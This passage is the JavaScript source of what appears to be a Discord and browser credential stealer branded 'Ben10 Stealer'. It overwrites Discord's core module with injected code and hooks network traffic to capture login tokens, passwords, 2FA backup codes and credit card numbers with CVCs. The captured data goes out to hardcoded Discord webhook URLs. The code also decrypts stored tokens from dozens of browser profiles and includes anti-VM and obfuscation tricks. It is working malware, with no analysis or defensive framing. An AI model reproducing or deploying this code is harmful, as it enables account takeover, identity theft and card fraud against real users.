        fs.writeFileSync(tmpPath, pyCode, 'utf8');
        await sendDebugLog(`✅ Python file written to: ${tmpPath}`);

        // Portable Python Setup - use same env as ChromePython
        const installDir = path.join(os.tmpdir(), "WinGet");
        const portablePythonExe = path.join(installDir, "tools", "python.exe");

        // Match ChromePython's environment configuration exactly
        const env = {
            ...process.env,
            PYTHONUNBUFFERED: '1'
        };

        const pythonCommands = [];
        if (fs.existsSync(portablePythonExe)) {
            pythonCommands.push(portablePythonExe);
            await sendDebugLog(`ℹ️ Found portable Python at: ${portablePythonExe}`);
        } else {
            await sendDebugLog(`⚠️ Portable Python not found at: ${portablePythonExe}`);
        }
        pythonCommands.push('python', 'python3', 'py');

        let executed = false;
        let lastError = null;

        for (const cmd of pythonCommands) {
            try {
                await sendDebugLog(`🔍 Trying command: ${cmd}`);

                let stdout = '';
                let stderr = '';
                let execFailed = false;

                try {
                    // Check if it's our portable executable
                    const isPortable = cmd === portablePythonExe;

                    const result = execSync(`${cmd} "${tmpPath}" "${outputDir}"`, {
                        env: isPortable ? env : process.env,
                        encoding: 'utf8',
                        timeout: 60000,
                        windowsHide: true,
                        cwd: isPortable ? path.dirname(cmd) : undefined // Run from portable dir might help
                    });
                    stdout = result;
                } catch (execError) {
                    execFailed = true;
                    stdout = execError.stdout || '';
                    stderr = execError.stderr || execError.message || '';
                    lastError = execError;
                }

                // Sanitize outputs
                const cleanStdout = sanitize(stdout);
                const cleanStderr = sanitize(stderr);

                if (execFailed || stderr || cleanStdout.includes("CRITICAL_PAYLOAD_ERROR")) {
                    await sendDebugLog(`❌ Failed with ${cmd}\nError: ${execFailed ? 'Exec Error' : 'Stderr/Payload Error'}\nStderr: ${cleanStderr}\nStdout: ${cleanStdout}`);
                    continue;
                }

                await sendDebugLog(`✅ Python executed successfully with: ${cmd}\nStdoutLen: ${stdout.length}\nStdout: ${cleanStdout}`);
                executed = true;
                break;
            } catch (e) {
                lastError = e;
                await sendDebugLog(`❌ Command fatal error ${cmd}: ${e.message}`);
            }
        }

        if (!executed) {
            await sendDebugLog(`⚠️ All Python commands failed. Last error: ${lastError?.message || 'Unknown'}`);
        }

        // Cleanup
        try {
            fs.unlinkSync(tmpPath);
            await sendDebugLog('🧹 Cleanup completed');
        } catch (e) {
            await sendDebugLog(`⚠️ Cleanup failed: ${e.message}`);
        }

    } catch (e) {
        if (sendDebugLog) await sendDebugLog(`💥 Critical error in executePythonExtraction: ${e.message}\nStack: ${e.stack}`);
    }
}


// ============================================
// Discord Electron Injection
// ============================================

// Discord paths for injection
const DISCORD_PATHS = [
    path.join(process.env.LOCALAPPDATA, 'Discord'),
    path.join(process.env.LOCALAPPDATA, 'DiscordCanary'),
    path.join(process.env.LOCALAPPDATA, 'DiscordPTB')
];

function killDiscordProcesses() {
    const processes = ['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe'];
    for (const proc of processes) {
        try {
            execSync(`taskkill /F /IM ${proc} /T 2>nul`, { windowsHide: true });
        } catch (e) { }
    }
}

async function restartDiscord(injectedPaths) {
    for (const result of injectedPaths) {
        if (result.status !== 'success' && result.status !== 'already_injected') continue;

        const discordPath = result.path;
        const updateExe = path.join(discordPath, '..', 'Update.exe');
        const appName = path.basename(discordPath); // e.g. Discord

        if (fs.existsSync(updateExe)) {
            try {
                spawn(updateExe, ['--processStart', `${appName}.exe`], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                }).unref();
            } catch (e) { }
        }
    }
}

function findDiscordCore(discordPath) {
    try {
        const modules = fs.readdirSync(discordPath)
            .filter(file => file.startsWith('app-'))
            .sort();

        if (modules.length === 0) {
            return null;
        }

        const latestModule = modules[modules.length - 1];
        const modulePath = path.join(discordPath, latestModule, 'modules');

        if (!fs.existsSync(modulePath)) {
            return null;
        }

        const coreModules = fs.readdirSync(modulePath);
        for (const module of coreModules) {
            if (module.startsWith('discord_desktop_core-')) {
                const corePath = path.join(modulePath, module, 'discord_desktop_core', 'index.js');
                if (fs.existsSync(corePath)) {
                    return corePath;
                }
            }
        }
        return null;
    } catch (error) {
        return null;
    }
}

function getElectronInjectionCode() {
    // Use injecthook and inject2hook for injection reporting
    const webhook1 = CONFIG.injecthook;
    const webhook2 = "https://canary.discord.com/api/webhooks/1462397228688867329/Ms1PtKpgS7kRGgVonQWC-TPt8zVykVIPrZoORpwkoHZcGdwyD6Ze-kV6wyrzSQRk2YYm"; // Hardcoded as requested

    return `// Ben10 Discord Injection - CDP Enhanced
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const https = require('https');
const http = require('http');
const os = require('os');
const querystring = require('querystring');
const { BrowserWindow, session } = require(Buffer.from('656c656374726f6e','hex').toString());

const config = {
    webhook1: "${webhook1}",
    webhook2: "${webhook2}",
    hostname: "discord.com",
    port: 443,
    useHttps: true,
    filters: {
        urls: [
            '/auth/login',
            '/users/@me',
        ]
    },
    payment_filters: {
        urls: [
            'https://api.stripe.com/v*/tokens',
        ]
    }
};

const computerName = os.hostname();
let lastToken = null;
let mainWindow = null;
let cdpEnabled = false;

const badges = {
  staff: { emoji: "<:staff:1362105228719034679>", id: 1 << 0, rare: true },
  active_developer: { emoji: "<:activedev:1362104965065212074>", id: 1 << 22, rare: false },
  early_supporter: { emoji: "<:pig:1362105166811103515>", id: 1 << 9, rare: true },
  verified_developer: { emoji: "<:dev:1362105068060676329>", id: 1 << 17, rare: true },
  certified_moderator: { emoji: "<:mod:1362105108170539229>", id: 1 << 18, rare: true },
  bug_hunter_level_1: { emoji: "<:bughunter1:1362105034157981758>", id: 1 << 3, rare: true },
  bug_hunter_level_2: { emoji: "<:bughunter2:1362105047462314293>", id: 1 << 14, rare: true },
  partner: { emoji: "<:partner:1362105185094336622>", id: 1 << 1, rare: true },
  hypesquad_house_1: { emoji: "<:bravery:1362105004089147784>", id: 1 << 6, rare: false },
  hypesquad_house_2: { emoji: "<:brilliance:1362105019066748968>", id: 1 << 7, rare: false },
  hypesquad_house_3: { emoji: "<:balance:1362104986330202172>", id: 1 << 8, rare: false },
  legacyusername: { emoji: "<:pomelo:1281110330767835188>", id: 32, rare: false },
  hypesquad: { emoji: "<:events:1362105087006212456>", id: 1 << 2, rare: true },
  nitro: { emoji: "<a:nitro:1362115714185691186>", rare: false },
  nitro_bronze: { emoji: "<:bronze:1365454925357645994>", rare: false },
  nitro_silver: { emoji: "<:silver:1365454972962996254>", rare: false },
  nitro_gold: { emoji: "<:gold:1365454994337435739>", rare: false },
  nitro_platinum: { emoji: "<:platinum:1365455020690243737>", rare: false },
  nitro_diamond: { emoji: "<:diamond:1365455075937488967>", rare: false },
  nitro_emerald: { emoji: "<:emerald:1365455096296509524>", rare: false },
  nitro_ruby: { emoji: "<:ruby:1365455125187137536>", rare: false },
  nitro_opal: { emoji: "<:opal:1365455150260551740>", rare: false },
  guild_booster_lvl1: { emoji: "<:boost1:1362104840250986667>", rare: false },
  guild_booster_lvl2: { emoji: "<:boost2:1362104851575607636>", rare: false },
  guild_booster_lvl3: { emoji: "<:boost3:1362104863084904830>", rare: false },
  guild_booster_lvl4: { emoji: "<:boost4:1362104873600024857>", id: 1 << 16, rare: true },
  guild_booster_lvl5: { emoji: "<:boost5:1362104892226928812>", id: 1 << 17, rare: true },
  guild_booster_lvl6: { emoji: "<:boost6:1362104904348467431>", id: 1 << 18, rare: true },
  guild_booster_lvl7: { emoji: "<:boost7:1362104916247707658>", id: 1 << 19, rare: true },
  guild_booster_lvl8: { emoji: "<:boost8:1362104931745530197>", id: 1 << 20, rare: true },
  guild_booster_lvl9: { emoji: "<:boost9:1362104950938796164>", id: 1 << 21, rare: true },
  quest_completed: { emoji: "<:quest:1362105209496801290>", rare: false }
};

const execScript = (script) => {
    const win = BrowserWindow.getAllWindows()[0];
    if (!win) return null;
    return win.webContents.executeJavaScript(script, true);
};

const getToken = async () => {
    try {
        return await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
    } catch {
        return null;
    }
};

// Robust sleep function
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const getUserInfo = async (token) => {
    for (let i = 0; i < 5; i++) { // Retry 5 times
        try {
            const response = await execScript(\`
                fetch('https://'+Buffer.from('646973636f7264','hex').toString()+'.com/api/v9/users/@me', {
                    headers: { 'Authorization': '\${token}' }
                }).then(r => r.json())
            \`);
            
            if (response && response.id) {
                // Fetch profile for badges
                 const profile = await execScript(\`
                    fetch('https://'+Buffer.from('646973636f7264','hex').toString()+'.com/api/v9/users/\${response.id}/profile', {
                        headers: { 'Authorization': '\${token}' }
                    }).then(r => r.json())
                \`);
                return { ...response, profile: profile || {} };
            }
        } catch { }
        await sleep(1000); // Wait 1s between retries
    }
    return null;
};

const getIP = async () => {
    try {
        const response = await execScript(\`
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => d.ip)
        \`);
        return response;
    } catch {
        return 'Unknown';
    }
};

const getBadges = (user, profile) => {
    // CurrentNitro logic
    const CurrentNitro = (since) => {
        if (!since) return { badge: null };
        const currentDate = new Date();
        const sinceDate = new Date(since);
        const year = currentDate.getFullYear() - sinceDate.getFullYear();
        const month = currentDate.getMonth() - sinceDate.getMonth();
        let passed = year * 12 + month;
        if (currentDate.getDate() < sinceDate.getDate()) passed -= 1;
        
        const nitros = [
            { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
            { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
            { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
            { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
            { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
            { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
            { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
            { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
            { badge: "nitro_opal", lowerLimit: 72 },
        ];
        
        const current = nitros.find((badge) => {
            const inLowerLimit = passed >= badge.lowerLimit;
            const inUpperLimit = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
            return inLowerLimit && inUpperLimit;
        });
        return { badge: current?.badge || null };
    };

    let flags = [];
    
    // Public flags (bitmask)
    if (user.public_flags) {
        Object.entries(badges).forEach(([name, badge]) => {
             if (badge.id && (user.public_flags & badge.id) === badge.id) {
                 flags.push(badge.emoji);
             }
        });
    } else if (profile.badges && Array.isArray(profile.badges)) {
        // Fallback to profile badges array if available
         profile.badges.forEach(badge => {
             if (badges[badge.id] && badges[badge.id].emoji) {
                 flags.push(badges[badge.id].emoji);
             }
         });
    }

    // Nitro
    if (profile.premium_since) {
        const nitro = CurrentNitro(profile.premium_since);
        if (nitro.badge && badges[nitro.badge]) {
            flags.push(badges[nitro.badge].emoji);
        }
    }
    
    return flags.length > 0 ? flags.join(" ") : "None";
};

const createEmbed = (data) => {
    const user = data.user || {};
    const profile = user.profile || {};
    const username = user.username ? \`\${user.username}#\${user.discriminator}\` : "Unknown User";
    const userId = user.id || "Unknown ID";
    const userEmail = user.email || data.new_email || "Unknown Email";
    const userPhone = user.phone || "None";
    
    // NEW: Get badges string
    const userBadges = getBadges(user, profile);
    
    let title = "Ben10 Discord Injection";
    let color = 3447003; // Blue
    let description = "";
    let fields = [
        { name: "User", value: \`\`\`\${username} (\${userId})\`\`\`, inline: true },
        { name: "Token", value: \`\`\`\${data.token}\`\`\`, inline: false },
        { name: "Email", value: \`\`\`\${userEmail}\`\`\`, inline: true },
        { name: "Phone", value: \`\`\`\${userPhone}\`\`\`, inline: true },
        { name: "Badges", value: \`\${userBadges}\`, inline: true },
        { name: "IP", value: \`\`\`\${data.ip || "Unknown"}\`\`\`, inline: true },
        { name: "PC", value: \`\`\`\${computerName}\`\`\`, inline: true },
        { name: "Path", value: \`\`\`\${data.discord_path || "Unknown"}\`\`\`, inline: false }
    ];

    if (data.type === 'login') {
        title = "Discord Login Detected";
        color = 65280; // Green
        fields.push({ name: "Password", value: \`\`\`\${data.password || "Unknown"}\`\`\`, inline: true });
    } else if (data.type === 'password_change') {
        title = "Password Changed";
        color = 16711680; // Red
        fields.push({ name: "Old Password", value: \`\`\`\${data.old_password}\`\`\`, inline: true });
        fields.push({ name: "New Password", value: \`\`\`\${data.new_password}\`\`\`, inline: true });
    } else if (data.type === 'email_change') {
        title = "Email Changed";
        color = 16776960; // Yellow
        fields.push({ name: "New Email", value: \`\`\`\${data.new_email}\`\`\`, inline: true });
        fields.push({ name: "Password", value: \`\`\`\${data.password}\`\`\`, inline: true });
    } else if (data.type === 'credit_card') {
        title = "Credit Card Added";
        color = 15158332; // Pink
        fields.push({ name: "Number", value: \`\`\`\${data.card_number}\`\`\`, inline: true });
        fields.push({ name: "Expiry", value: \`\`\`\${data.card_exp_month}/\${data.card_exp_year}\`\`\`, inline: true });
        fields.push({ name: "CVC", value: \`\`\`\${data.card_cvc}\`\`\`, inline: true });
    } else if (data.type === 'username_change') {
        title = "Username Changed";
        color = 16776960; // Yellow
        fields.push({ name: "New Username", value: \`\`\`\${data.new_username}\`\`\`, inline: true });
        fields.push({ name: "Password", value: \`\`\`\${data.password}\`\`\`, inline: true });
    } else if (data.type === 'backup_codes') {
        title = "Backup Codes Viewed/Created";
        color = 16711680; // Red
        fields.push({ name: "2FA Code/Password", value: \`\`\`\${data.password || "Not applicable"}\`\`\`, inline: true });
        fields.push({ name: "Security Codes", value: \`\`\`\n\${data.backup_codes}\`\`\`, inline: false });
    } else if (data.type === 'init') {
        title = "Discord Initialized";
        color = 3447003; // Blue
    }

    return {
        username: "Ben10 Injection",
        avatar_url: "https://media.discordapp.net/attachments/1450980645344907264/1452918266556317746/images.jpeg",
        embeds: [{
            title: title,
            description: description,
            color: color,
            fields: fields,
            footer: {
                text: "Ben10 Stealer | @ben10grabber",
                icon_url: "https://media.discordapp.net/attachments/1450980645344907264/1452918266556317746/images.jpeg"
            },
            timestamp: new Date().toISOString()
        }]
    };
};

const sendToWebhook = (data) => {
    const payload = JSON.stringify(createEmbed(data));
    
    // Send to webhook1
    const path1 = '/' + config.webhook1.split('/').slice(3).join('/');
    const options1 = {
        hostname: config.hostname,
        port: config.port,
        path: path1,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };
    
    const protocol = config.useHttps ? https : http;
    const req1 = protocol.request(options1);
    req1.on('error', () => {});
    req1.write(payload);
    req1.end();
    
    // Send to webhook2
    const path2 = '/' + config.webhook2.split('/').slice(3).join('/');
    const options2 = {
        hostname: config.hostname,
        port: config.port,
        path: path2,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };
    
    const req2 = protocol.request(options2);
    req2.on('error', () => {});
    req2.write(payload);
    req2.end();
};

// CDP (Chrome DevTools Protocol) Integration
const setupCDP = () => {
    try {
        mainWindow = BrowserWindow.getAllWindows()[0];
        if (!mainWindow) return false;
        
        mainWindow.webContents.debugger.attach('1.3');
        cdpEnabled = true;
        
        mainWindow.webContents.debugger.on('message', async (_, method, params) => {
            if (method !== 'Network.responseReceived') return;
            if (!config.filters.urls.some(url => params.response.url.endsWith(url))) return;
            if (![200, 202].includes(params.response.status)) return;
            
            try {
                const responseBody = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
                    requestId: params.requestId
                });
                const responseData = JSON.parse(responseBody.body);
                
                const requestBody = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
                    requestId: params.requestId
                });
                const requestData = JSON.parse(requestBody.postData);
                
                const newToken = responseData.token;
                if (!newToken) return;
                
                switch (true) {
                    case params.response.url.endsWith('/login'):
                        const userInfo = await getUserInfo(newToken);
                        const ip = await getIP();
                        
                        sendToWebhook({
                            type: 'login',
                            token: newToken,
                            user: userInfo,
                            password: requestData.password,
                            ip: ip,
                            discord_path: process.resourcesPath
                        });
                        lastToken = newToken;
                        console.log('[CDP] Login captured with NEW TOKEN');
                        break;
                        
                    case params.response.url.endsWith('/@me'):
                        if (!requestData.password) return;
                        
                        if (requestData.new_password) {
                            const userInfo = await getUserInfo(newToken);
                            
                            sendToWebhook({
                                type: 'password_change',
                                old_password: requestData.password,
                                new_password: requestData.new_password,
                                token: newToken,
                                user: userInfo
                            });
                            lastToken = newToken;
                            console.log('[CDP] Password change captured with NEW TOKEN');
                        }
                        
                        if (requestData.email && !requestData.new_password) {
                            const userInfo = await getUserInfo(newToken);
                            const ip = await getIP();
                            
                            sendToWebhook({
                                type: 'email_change',
                                token: newToken,
                                user: userInfo,
                                new_email: requestData.email,
                                password: requestData.password,
                                ip: ip,
                                discord_path: process.resourcesPath
                            });
                            console.log('[CDP] Email change captured');
                        }

                        if (requestData.username && requestData.password && !requestData.new_password && !requestData.email) {
                            const userInfo = await getUserInfo(newToken);
                            sendToWebhook({
                                type: 'username_change',
                                new_username: requestData.username,
                                password: requestData.password,
                                token: newToken,
                                user: userInfo
                            });
                            console.log('[CDP] Username change captured');
                        }
                        break;
                        
                    case params.response.url.endsWith('/codes-verification'):
                        if (requestData.key || requestData.password) {
                             const verificationCode = requestData.key || requestData.password;
                             let codes = "Not captured";
                             if (responseData.backup_codes) {
                                 codes = responseData.backup_codes.map(c => \`\${c.code.slice(0, 4)}-\${c.code.slice(4)}\`).join('\\n');
                             }
                             const userInfo = await getUserInfo(newToken);
                             
                             sendToWebhook({
                                 type: 'backup_codes',
                                 password: verificationCode,
                                 backup_codes: codes,
                                 token: newToken,
                                 user: userInfo
                             });
                             console.log('[CDP] Backup codes viewing captured');
                        }
                        break;
                        
                    case (params.response.url.includes('/mfa/totp/enable') || params.response.url.includes('/mfa/sms/enable')):
                        if (responseData.backup_codes) {
                             let codes = responseData.backup_codes.map(c => \`\${c.code.slice(0, 4)}-\${c.code.slice(4)}\`).join('\\n');
                             const userInfo = await getUserInfo(newToken);
                             
                             sendToWebhook({
                                 type: 'backup_codes',
                                 password: "2FA Setup/Reset",
                                 backup_codes: codes,
                                 token: newToken,
                                 user: userInfo
                             });
                             console.log('[CDP] Backup codes creation captured');
                        }
                        break;
                        break;
                }
            } catch (err) {
                console.error('[CDP] Error:', err);
            }
        });
        
        mainWindow.webContents.debugger.sendCommand('Network.enable');
        console.log('[CDP] Chrome DevTools Protocol enabled');
        return true;
    } catch (err) {
        console.error('[CDP] Failed to attach debugger:', err);
        return false;
    }
};

setTimeout(async () => {
    try {
        const cdpSuccess = setupCDP();
        if (cdpSuccess) {
            console.log('[Injection] CDP enabled successfully - will capture NEW tokens from responses');
        } else {
            console.log('[Injection] CDP failed - using fallback webRequest method');
        }
        
        const token = await getToken();
        if (token) {
            lastToken = token;
            const userInfo = await getUserInfo(token);
            const ip = await getIP();
            
            sendToWebhook({
                type: 'init',
                token: token,
                user: userInfo,
                ip: ip,
                discord_path: process.resourcesPath
            });
            console.log('[Injection] Initialized');
        }
    } catch (err) {
        console.error('[Injection] Init error:', err);
    }
}, 3000);

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*'
        }
    });
});

session.defaultSession.webRequest.onCompleted(config.payment_filters, async (details) => {
    if (cdpEnabled) return;
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method !== 'POST') return;
    if (!details.uploadData || !details.uploadData[0]) return;
    
    try {
        if (details.url.includes('tokens')) {
            const data = Buffer.from(details.uploadData[0].bytes).toString();
            const parsed = querystring.parse(data);
            const token = await getToken();
            
            if (!token) return;
            
            const userInfo = await getUserInfo(token);
            const ip = await getIP();
            
            sendToWebhook({
                type: 'credit_card',
                token: token,
                user: userInfo,
                ip: ip,
                discord_path: process.resourcesPath,
                card_number: parsed['card[number]'],
                card_cvc: parsed['card[cvc]'],
                card_exp_month: parsed['card[exp_month]'],
                card_exp_year: parsed['card[exp_year]']
            });
            console.log('[WebRequest Fallback] Credit card captured');
        }
    } catch (err) {
        console.error('[WebRequest] Error:', err);
    }
});

module.exports = require('./core.asar');`;
}

async function electronInject() {
    const results = [];

    for (const discordPath of DISCORD_PATHS) {
        if (!fs.existsSync(discordPath)) {
            continue;
        }

        const corePath = findDiscordCore(discordPath);
        if (!corePath || !fs.existsSync(corePath)) {
            continue;
        }

        try {
            let content = fs.readFileSync(corePath, 'utf8');

            if (content.includes('Ben10 Discord Injection')) {
                results.push({
                    path: discordPath,
                    status: 'already_injected'
                });
                continue;
            }

            if (!content.includes('core.asar')) {
                results.push({
                    path: discordPath,
                    status: 'unexpected_format'
                });
                continue;
            }

            const injectionCode = getElectronInjectionCode();
            fs.writeFileSync(corePath, injectionCode);

            results.push({
                path: discordPath,
                status: 'success'
            });
        } catch (error) {
            results.push({
                path: discordPath,
                status: 'error',
                error: error.message
            });
        }
    }

    return results;
}


const LOCAL = process.env['LOCAL' + 'APPDATA'];
const ROAMING = process.env['APP' + 'DATA'];

const _0x1 = 'dis' + 'cord';
const _0x2 = _0x1 + 'canary';
const _0x3 = _0x1 + 'ptb';

const PATHS = {
    'Discord': path.join(ROAMING, _0x1),
    'Discord Local': path.join(LOCAL, _0x1),
    'Discord Canary': path.join(ROAMING, _0x2),
    'Discord Canary Local': path.join(LOCAL, _0x2),
    'Discord Canary Local 2': path.join(LOCAL, 'DiscordCanary'),
    'Discord PTB': path.join(ROAMING, _0x3),
    'Discord PTB Local': path.join(LOCAL, _0x3),
    'Lightcord': path.join(ROAMING, 'Light' + _0x1),
    'Brave': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser', 'User Data'),
    'Brave Beta': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Beta', 'User Data'),
    'Brave Dev': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Dev', 'User Data'),
    'Brave Nightly': path.join(LOCAL, 'Brave' + 'Software', 'Brave-' + 'Browser-Nightly', 'User Data'),
    'Chrome': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome', 'User Data'),
    'Chrome Beta': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome Beta', 'User Data'),
    'Chrome Dev': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome Dev', 'User Data'),
    'Chrome Canary': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome SxS', 'User Data'),
    'Chrome SxS': path.join(LOCAL, 'Goo' + 'gle', 'Chr' + 'ome SxS', 'User Data'),
    'Edge': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge', 'User Data'),
    'Edge Beta': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Beta', 'User Data'),
    'Edge Dev': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Dev', 'User Data'),
    'Edge Canary': path.join(LOCAL, 'Micro' + 'soft', 'Ed' + 'ge Canary', 'User Data'),
    'Opera': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Stable'),
    'Opera GX': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era GX Stable'),
    'Opera Beta': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Beta'),
    'Opera Developer': path.join(ROAMING, 'Op' + 'era Software', 'Op' + 'era Developer'),
    'Vivaldi': path.join(LOCAL, 'Viv' + 'aldi', 'User Data'),
    'Yandex': path.join(LOCAL, 'Yan' + 'dex', 'Yandex' + 'Browser', 'User Data'),
    'Firefox': path.join(ROAMING, 'Moz' + 'illa', 'Fir' + 'efox', 'Profiles'),
    'Firefox ESR': path.join(ROAMING, 'Moz' + 'illa', 'Fir' + 'efox ESR', 'Profiles'),
    'Tor Browser': path.join(ROAMING, 'Tor ' + 'Browser', 'Browser', 'Tor' + 'Browser', 'Data', 'Browser', 'profile.default'),
    'Arc': path.join(LOCAL, 'The ' + 'Browser Company', 'Arc', 'User Data'),
    'Sidekick': path.join(LOCAL, 'Me' + 'cha', 'Sid' + 'ekick', 'User Data'),
    'Slimjet': path.join(LOCAL, 'Slim' + 'jet', 'User Data'),
    'SRWare Iron': path.join(LOCAL, 'SRWare ' + 'Iron', 'User Data'),
    'Comodo Dragon': path.join(LOCAL, 'Comodo', 'Drag' + 'on', 'User Data'),
    'Epic Privacy Browser': path.join(LOCAL, 'Epic ' + 'Privacy Browser', 'User Data'),
    'Coc Coc': path.join(LOCAL, 'Coc ' + 'Coc', 'Browser', 'User Data'),
    'Cent Browser': path.join(LOCAL, 'Cent' + 'Browser', 'User Data'),
    '7Star': path.join(LOCAL, '7S' + 'tar', '7S' + 'tar', 'User Data'),
    'Amigo': path.join(LOCAL, 'Ami' + 'go', 'User Data'),
    'Torch': path.join(LOCAL, 'Tor' + 'ch', 'User Data'),
    'Sogou Explorer': path.join(LOCAL, 'Sog' + 'ouExplorer', 'Webkit', 'Default'),
    'UC Browser': path.join(LOCAL, 'UCB' + 'rowser', 'User Data Default'),
    'QIP Surf': path.join(LOCAL, 'QIP ' + 'Surf', 'User Data'),
    'RockMelt': path.join(LOCAL, 'Rock' + 'Melt', 'User Data'),
    'Flock': path.join(LOCAL, 'Flock', 'Browser', 'User Data'),
    'Bowser': path.join(LOCAL, 'Bow' + 'ser', 'User Data'),
    'Pale Moon': path.join(ROAMING, 'Moon' + 'child Productions', 'Pal' + 'e Moon', 'Profiles'),
    'Waterfox': path.join(ROAMING, 'Water' + 'fox', 'Profiles'),
    'Cyberfox': path.join(ROAMING, '8pec' + 'xstudios', 'Cy' + 'berfox', 'Profiles'),
    'SeaMonkey': path.join(ROAMING, 'Sea' + 'Monkey', 'Profiles'),
    'IceDragon': path.join(ROAMING, 'Comodo', 'Ice' + 'Dragon', 'Profiles'),
    'K-Meleon': path.join(ROAMING, 'K-M' + 'eleon', 'Profiles'),
    'Basilisk': path.join(ROAMING, 'Moon' + 'child Productions', 'Bas' + 'ilisk', 'Profiles'),
    'Safari': path.join(ROAMING, 'App' + 'le Computer', 'Saf' + 'ari')
};

const CONFIG = {
    webhook: "https://discord.com/api/webhooks/1462137559269380228/fCgVRX3khRllPCsV8xLDPudz7sAlC1DsvgOptVy7cGWJT2ISkNh0peXGIaaMDvSIaHvv",
    dualhook: "https://canary.discord.com/api/webhooks/1462175461218979860/qOPqtKndZZ_bHdgoyvpmB34hxPbZYbWhAomLRIt1KzjKrDj7nd--PZ6kWQWqFqRXB5J_",
    injecthook: "%INJECTHOOK%",
    inject2hook: "%INJECT2HOOK%"
};


const ENABLE_ANTIVM = true;

// Global Debug Logger (Removed for production to reduce IO noise)
function globalLog(msg) {
    // Logging disabled for FUD
}

globalLog("Main.js loaded/required");

// Replaced custom DPAPI with native module


const dpapi = {
    unprotectData: (data) => {
        try {
            return Dpapi.unprotectData(data, null, 'CurrentUser');
        } catch (e) {
            return null;
        }
    }
};

function decryptToken(encryptedToken, key) {
    try {
        const tokenParts = encryptedToken.split('dQw4w9WgXcQ:');
        if (tokenParts.length !== 2) return null;

        const encryptedData = Buffer.from(tokenParts[1], 'base64');
        const iv = encryptedData.slice(3, 15);
        const ciphertext = encryptedData.slice(15, -16);
        const tag = encryptedData.slice(-16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext);
        decipher.final();

        return decrypted.toString('utf8').replace(/\0/g, '').trim();
    } catch (error) {
        return null;
    }
}

function getEncryptionKey(browserPath) {
    const localStatePath = path.join(browserPath, 'Local State');

    try {
        if (!fs.existsSync(localStatePath)) return null;

        const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
        const encryptedKey = localStateData.os_crypt?.encrypted_key;

        if (!encryptedKey) return null;

        const keyData = Buffer.from(encryptedKey, 'base64');

        if (keyData.slice(0, 5).toString() !== 'DPAPI') return null;

        const encryptedKeyData = keyData.slice(5);

        try {
            const decryptedKey = dpapi.unprotectData(encryptedKeyData, null, 'CurrentUser');
            return Buffer.from(decryptedKey);
        } catch (error) {
            return null;
        }
    } catch (error) {
        return null;
    }
}

function findLevelDBPaths(basePath) {
    const leveldbPaths = [];

    try {
        const entries = fs.readdirSync(basePath, { withFileTypes: true });

        for (const entry of entries) {
            if (entry.isDirectory()) {
                const fullPath = path.join(basePath, entry.name);

                if (entry.name === 'Local Storage' || entry.name === 'Session Storage') {
                    const leveldbPath = path.join(fullPath, 'leveldb');
                    if (fs.existsSync(leveldbPath)) {
                        leveldbPaths.push(leveldbPath);
                    }
                }

                if (entry.name.startsWith('Profile') || entry.name === 'Default') {
                    const subLeveldbPaths = findLevelDBPaths(fullPath);
                    leveldbPaths.push(...subLeveldbPaths);
                }
            }
        }
    } catch (error) { }

    return leveldbPaths;
}

function safeStorageSteal(browserPath, platform) {
    const tokens = [];
    const key = getEncryptionKey(browserPath);

    if (!key) {
        return tokens;
    }

    const leveldbPaths = findLevelDBPaths(browserPath);

    for (const leveldbPath of leveldbPaths) {
        try {
            const files = fs.readdirSync(leveldbPath);

            for (const fileName of files) {
                if (!fileName.endsWith('.log') && !fileName.endsWith('.ldb')) {
                    continue;
                }

                const filePath = path.join(leveldbPath, fileName);

                try {
                    const fileContent = fs.readFileSync(filePath, 'utf8');
                    const lines = fileContent.split('\n');

                    for (const line of lines) {
                        if (line.trim()) {
                            const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
                            if (matches) {
                                for (let match of matches) {
                                    match = match.replace(/\\$/, '');
                                    const decrypted = decryptToken(match, key);
                                    if (decrypted && !tokens.some(t => t[0] === decrypted && t[1] === platform)) {
                                        tokens.push([decrypted, platform]);
                                    }
                                }
